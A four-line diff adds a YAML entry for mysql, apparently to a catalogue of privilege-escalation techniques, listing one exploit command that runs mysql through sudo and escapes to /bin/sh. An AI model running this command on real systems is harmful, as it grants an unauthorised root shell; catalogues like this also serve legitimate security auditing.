@@ -1,0 +1,4 @@
+name: mysql
+binary_path: /usr/bin/mysql
+exploit_cmds:
+- sudo /usr/bin/mysql -e '\! /bin/sh'
